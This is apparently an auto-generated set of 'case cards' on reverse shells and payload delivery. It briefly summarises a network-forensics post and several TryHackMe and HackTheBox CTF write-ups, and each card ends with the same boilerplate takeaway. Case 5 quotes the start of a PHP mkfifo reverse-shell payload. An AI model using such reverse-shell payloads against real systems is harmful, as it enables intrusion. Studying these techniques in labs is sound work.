# Structured Case Cards and Real-World Scenarios

> Sub-skill: [`reverse-shells-and-payload-delivery`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Distilled case cards from disclosed reports, CISA KEVs, verified code corpora, and L5 technical analyses.

## Case 1: Latrodectus BackConnect

- **Provenance:** Source: `CYBER_CPT/netresec`
- **Context / Surface:** PCAP / Network Forensics (en)
- **Root Cause / Analysis:** Latrodectus BackConnect This blog post demonstrates how artifacts, such as reverse shell commands and VNC session screenshots, can be extracted from Latrodectus BackConnect C2 traffic with NetworkMiner.
- **Actionable Takeaway:** Cross-check preconditions and telemetry before applying to the target.

## Case 2: HTB: Sightless Writeup / Walkthrough

- **Provenance:** Source: `CYBER_CPT/L5/ctf_search`
- **Context / Surface:** High-depth analysis (ctf_search, edu=4)
- **Root Cause / Analysis:** HTB: Sightless Writeup / Walkthrough Welcome to this WriteUp of the HackTheBox machine "Sightless". A short summary of how I proceeded to root the machine: - a reverse shell obtained through the vulnerability CVE-2022-0944 - escaped the docker and logged in via ssh by cracking the password hash of the user michael -...
- **Actionable Takeaway:** Validate root-cause preconditions and apply defense-in-depth controls.

## Case 3: THM — Mr Robot CTF

- **Provenance:** Source: `CYBER_CPT/L5/ctf_search`
- **Context / Surface:** High-depth analysis (ctf_search, edu=4)
- **Root Cause / Analysis:** THM — Mr Robot CTF Nmap, gobuster, base64 decoder, sort, uniq, burpsuite, turbointruder, php reverse shell, netcat, crackstation, find, gtfobin Nmap bash kali@kali:~$ sudo nmap -sC -sV -O 10.10.151.156 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org/ ) at 2020-11-26 22:48 EST Nmap scan report for...
- **Actionable Takeaway:** Validate root-cause preconditions and apply defense-in-depth controls.

## Case 4: TryHackMe / h4cked / Walkthrough

- **Provenance:** Source: `CYBER_CPT/L5/ctf_search`
- **Context / Surface:** High-depth analysis (ctf_search, edu=4)
- **Root Cause / Analysis:** TryHackMe / h4cked / Walkthrough https://tryhackme.com/room/h4cked SUMMARY Focus: Wireshark Analysis, Using Python to upgrade shell, Method Reproduction, FTP Tools: Wireshark, Reverse shell Knowledge Required: Basic python and php, basic FTP commands, basic terminal Attacker Timeline (Part 1): Brute forced FTP >...
- **Actionable Takeaway:** Validate root-cause preconditions and apply defense-in-depth controls.

## Case 5: TryHackMe-Overpass 2

- **Provenance:** Source: `CYBER_CPT/L5/ctf_search`
- **Context / Surface:** High-depth analysis (ctf_search, edu=4)
- **Root Cause / Analysis:** TryHackMe-Overpass 2 A Forensics Room involving an analysis on how Hackers got into the system and finding their activity. What was the URL of the page they used to upload a reverse shell? /development What payload did the attacker use to gain access? php <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f//bin/sh -i...
- **Actionable Takeaway:** Validate root-cause preconditions and apply defense-in-depth controls.

## Case 6: TryHackMe / Ignite Writeup

- **Provenance:** Source: `CYBER_CPT/L5/ctf_search`
- **Context / Surface:** High-depth analysis (ctf_search, edu=4)
- **Root Cause / Analysis:** TryHackMe / Ignite Writeup TryHackMe’s Ignite room is an easy room involving a vulnerable CMS service and a reverse shell to get from an initial nmap scan to root access. This writeup will go through every step required to complete the room. Task 1: Root it! 1.
- **Actionable Takeaway:** Validate root-cause preconditions and apply defense-in-depth controls.

## Case 7: TR / TryHackMe “Internal” Makinesi Çözümü

- **Provenance:** Source: `CYBER_CPT/L5/ctf_search`
- **Context / Surface:** High-depth analysis (ctf_search, edu=4)
- **Root Cause / Analysis:** TryHackMe "Internal" Makinesi Çözümü 1- Bilgi Toplama & WordPress ile Reverse Shell Alma İlk adım olarak internal.thm alan adını hedef IP'ye tanımlamak için aşağıdaki kodu çalıştırdım ve /etc/hosts dosyasının son görünümü aşağıdaki gibi olmalıdır. nano /etc/hosts 10.10.196.232 benim hedefimin ip adresi.
- **Actionable Takeaway:** Validate root-cause preconditions and apply defense-in-depth controls.

## Case 8: Anonymous WriteUp (THM)

- **Provenance:** Source: `CYBER_CPT/L5/ctf_search`
- **Context / Surface:** High-depth analysis (ctf_search, edu=4)
- **Root Cause / Analysis:** Anonymous WriteUp (THM) INTRODUCCIÓN Anonymous es una sala de dificultad media en TryHackMe. En ella repasaremos conceptos de enumeración, ftp, scripts, samba, tareas cron, reverse shell y una escalada de privilegios a través de la explotación de un comando con permisos SUID.
- **Actionable Takeaway:** Validate root-cause preconditions and apply defense-in-depth controls.
